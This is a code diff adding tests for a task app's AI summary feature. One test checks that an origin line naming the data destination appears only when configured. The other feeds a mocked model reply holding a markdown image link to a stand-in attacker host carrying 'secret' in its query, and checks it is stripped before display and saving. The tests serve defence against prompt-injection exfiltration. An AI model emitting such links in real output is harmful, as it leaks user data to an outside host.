@@ -238,6 +238,36 @@ test('a LAN endpoint asks before sending the titles and retries once allowed', a
 	expect(await render()).toContain('- Retried summary');
 });
 
+test('the summary shows the AI origin line only when a base URL is configured', async () => {
+	const { render } = await mountModal();
+	expect(await render()).toContain(
+		'Sends task titles, statuses and comment excerpts to http://localhost:11434.',
+	);
+
+	mockInvoke.mockImplementation(async () => ({ base_url: '' }));
+	const unconfigured = await mountModal();
+	expect(await unconfigured.render()).not.toContain('Sends task titles');
+});
+
+test('the AI answer is sanitized before it is shown or saved', async () => {
+	mockActive.mockReturnValue({ id: 1 });
+	mockLlm.llmComplete.mockResolvedValueOnce(
+		'- Wrote TM-1 ![t](https://evil.example/p?d=secret)\n- See [docs](https://example.com) <b>now</b>',
+	);
+	const { state, render } = await mountModal();
+
+	await state.summarize();
+	await state.savePage();
+
+	const shown = '- Wrote TM-1 \n- See docs now';
+	expect(state.summary.value).toBe(shown);
+	expect(await render()).not.toContain('evil.example');
+	expect(mockCreatePage).toHaveBeenCalledWith(
+		{},
+		expect.objectContaining({ body: shown }),
+	);
+});
+
 test('an empty day gives the plain summary without calling the model', async () => {
 	mockCollect.mockResolvedValueOnce({ tasks: [], skipped: [] });
 	const { state, render } = await mountModal();
